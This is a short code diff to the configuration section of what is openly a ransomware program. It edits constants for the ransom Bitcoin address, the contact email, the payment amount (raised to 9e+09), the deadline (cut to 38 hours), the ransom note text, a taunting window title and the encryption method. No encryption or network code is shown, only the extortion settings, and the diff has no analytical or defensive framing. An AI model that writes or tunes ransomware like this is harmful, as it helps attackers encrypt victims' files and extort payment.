@@ -4,12 +4,12 @@
 // === RANSOM INFORMATION ===
 const std::string RANSOM_BTC = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";
 const std::string RANSOM_EMAIL = "decrypt@onionmail.org";
-const double RANSOM_AMOUNT = 500;
-const int RANSOM_DEADLINE_HOURS = 72;
+const double RANSOM_AMOUNT = 9e+09;
+const int RANSOM_DEADLINE_HOURS = 38;
 const std::string RANSOM_MESSAGE = "Your files have been encrypted with military grade encryption.";
 
 // === GUI ===
-const std::string WINDOW_TITLE = "Idiot";
+const std::string WINDOW_TITLE = "You idiot";
 
 // === ENCRYPTION ===
 const std::string ENCRYPTION_METHOD = "XChaCha20Poly1305";
